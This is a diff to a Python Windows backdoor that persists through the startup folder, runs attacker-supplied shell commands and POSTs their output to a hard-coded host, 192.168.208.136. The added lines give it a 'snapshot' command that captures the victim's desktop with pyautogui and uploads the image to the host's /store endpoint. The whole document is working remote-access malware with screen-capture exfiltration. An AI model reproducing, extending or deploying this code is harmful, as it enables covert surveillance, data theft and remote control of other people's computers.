@@ -5,7 +5,11 @@ import time
 import os
 import winshell
 from win32com.client import Dispatch
+import pyautogui
+import tempfile #used this module to store snapshot of desktop in temp folder
 
+save = tempfile.mkdtemp("screen")#make an folder in temp
+#print(save)
 username = os.getlogin() #to get log in username
 source = os.listdir() # it return list of present files current in directory
 #now set the path of startup folder
@@ -59,6 +63,12 @@ while True:
             #requests library use POST method called "multipart/form-data"
         else:
             post_response = requests.post(url='http://192.168.208.136', data='[-] Not able to find the file !' )
+    elif 'snapshot' in command: # look for snapshot in command and enter above codes for sending
+        screenshot = pyautogui.screenshot()
+        screenshot.save(save+'\Screenshot.png')#here we type path also along with file name
+        url='http://192.168.208.136/store'
+        files = {'file': open(save+'\Screenshot.png', 'rb')} #and access the snapshot by giving permission
+        r=requests.post(url, files=files)
     else:
         CMD =  subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
         post_response = requests.post(url='http://192.168.208.136', data=CMD.stdout.read() ) 
